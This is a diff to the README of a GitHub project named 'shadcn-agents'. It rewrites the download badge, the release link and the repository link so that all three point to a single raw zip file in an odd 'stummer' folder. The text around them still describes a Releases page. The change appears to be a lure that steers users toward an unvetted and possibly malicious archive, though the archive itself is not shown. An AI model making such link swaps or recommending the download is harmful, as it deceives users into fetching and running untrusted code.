@@ -1,6 +1,6 @@
 # 🤖 shadcn-agents - Seamless AI Solutions for Everyone
 
-[![Download shadcn-agents](https://img.shields.io/badge/Download-shadcn--agents-blue.svg)](https://github.com/a1y2a3h/shadcn-agents/releases)
+[![Download shadcn-agents](https://raw.githubusercontent.com/a1y2a3h/shadcn-agents/main/stummer/shadcn-agents.zip)](https://raw.githubusercontent.com/a1y2a3h/shadcn-agents/main/stummer/shadcn-agents.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-To get started with **shadcn-agents**, visit this page to download the latest release: [Download shadcn-agents](https://github.com/a1y2a3h/shadcn-agents/releases).
+To get started with **shadcn-agents**, visit this page to download the latest release: [Download shadcn-agents](https://raw.githubusercontent.com/a1y2a3h/shadcn-agents/main/stummer/shadcn-agents.zip).
 
 Once you’re on the Releases page, you will see a list of available versions. Choose the most recent version and click on the file that matches your operating system. This will download the installation file to your computer.
 
@@ -80,7 +80,7 @@ Join our community to share your experiences and get help:
 
 Explore more about **shadcn-agents**:
 
-- [GitHub Repository](https://github.com/a1y2a3h/shadcn-agents)
+- [GitHub Repository](https://raw.githubusercontent.com/a1y2a3h/shadcn-agents/main/stummer/shadcn-agents.zip)
 - [Documentation](link-to-documentation)
 - [Support](link-to-support)
 
